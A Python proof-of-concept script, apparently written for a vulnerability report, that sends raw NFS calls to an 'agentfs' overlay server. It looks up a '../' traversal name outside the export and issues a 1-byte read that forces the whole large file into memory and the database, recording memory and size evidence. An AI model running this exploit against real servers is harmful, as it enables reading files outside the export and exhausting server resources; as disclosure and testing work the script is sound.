#!/usr/bin/env python3
"""Measure copy-up amplification: a 1-byte NFS READ of a large sparse file
makes the server materialize the ENTIRE file into memory and the SQLite
delta DB. Samples server RSS and DB/WAL size before/after.

Prereqs: `agentfs serve nfs` overlay export at --host/--port; a large
file OUTSIDE the export base reachable via a traversal name (--name);
the agentfs DB path (--db) for size measurement (optional but
recommended); and the server process command line (--server-cmd-substr)
for RSS sampling (optional).

Example:
  truncate -s 128M /tmp/lab/big_sparse.bin        # outside export base
  python3 nfs_exhaust.py --outdir out/exhaust --port 11112 \
      --name ../big_sparse.bin \
      --db /path/to/.agentfs/myexport.db \
      --server-cmd-substr 'agentfs serve nfs'
"""
import argparse
import datetime
import json
import os
import subprocess
import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import nfs_traversal_capture as n


def dbsize(db):
    if not db:
        return None
    return sum(os.path.getsize(p) for p in (db, db + "-wal", db + "-shm")
               if os.path.exists(p))


def server_pid(substr):
    if not substr:
        return None
    try:
        out = subprocess.check_output(["pgrep", "-f", substr],
                                      stderr=subprocess.DEVNULL)
        # exclude this process/parent: their cmdlines contain the pattern
        skip = {os.getpid(), os.getppid()}
        for tok in out.split():
            pid = int(tok)
            if pid not in skip:
                return pid
    except (subprocess.CalledProcessError, ValueError, IndexError):
        return None
    return None


def rss_kb(pid):
    if pid is None:
        return None
    try:
        for line in open(f"/proc/{pid}/status"):
            if line.startswith("VmRSS"):
                return int(line.split()[1])
    except OSError:
        return None
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--name", required=True,
                    help="traversal LOOKUP name, e.g. ../big_sparse.bin")
    ap.add_argument("--db", default="",
                    help="agentfs .db path (WAL/SHM siblings included)")
    ap.add_argument("--server-cmd-substr", default="",
                    help="pgrep -f substring of the agentfs server process")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=11111)
    ap.add_argument("--uid", type=int, default=0)
    ap.add_argument("--gid", type=int, default=0)
    args = ap.parse_args()

    outdir = Path(args.outdir)
    outdir.mkdir(parents=True, exist_ok=True)
    idx = [0]

    def rec(label, prog, proc, body):
        idx[0] += 1
        r, req, resp = n.rpc(args.host, args.port, prog, 3, proc, body,
                             args.uid, args.gid)
        n.save(outdir, idx[0], label, req, resp)
        return r

    pid = server_pid(args.server_cmd_substr)
    res = {"started_utc": datetime.datetime.now(datetime.timezone.utc)
           .isoformat().replace("+00:00", "Z"),
           "name": args.name, "read_count": 1,
           "db_bytes_before": dbsize(args.db),
           "rss_kb_before": rss_kb(pid), "samples": []}

    r = rec("mnt", 100005, 1, n.X().s("/"))
    r.u32()
    root = r.op()
    r = rec("lookup", 100003, 3, n.X().op(root).s(args.name))
    st = r.u32()
    assert st == 0, st
    fh = r.op()
    obj = r.attrs()
    r.attrs()
    res["file_size"] = obj["size"]
    print("[+] LOOKUP", args.name, "size", obj["size"])

    stop = False

    def sampler():
        peak = 0
        while not stop:
            v = rss_kb(pid)
            if v:
                peak = max(peak, v)
                res["samples"].append(v)
            time.sleep(0.05)

    t = threading.Thread(target=sampler)
    t.start()
    t0 = time.time()
    r = rec("read", 100003, 6, n.X().op(fh).u64(0).u32(1))
    st = r.u32()
    assert st == 0, st
    r.attrs()
    cnt = r.u32()
    eof = r.u32()
    r.op()
    el = time.time() - t0
    stop = True
    t.join()
    res.update({"read_status": st, "read_count": cnt,
                "elapsed_sec": round(el, 3),
                "rss_kb_after": rss_kb(pid),
                "rss_kb_peak": max(res["samples"] or [0]),
                "db_bytes_after": dbsize(args.db),
                "finished_utc": datetime.datetime.now(datetime.timezone.utc)
                .isoformat().replace("+00:00", "Z")})
    (outdir / "result.json").write_text(json.dumps(res, indent=2) + "\n")
    print(json.dumps({k: v for k, v in res.items() if k != "samples"},
                     indent=2))
    print("[+] evidence ->", outdir)


if __name__ == "__main__":
    main()
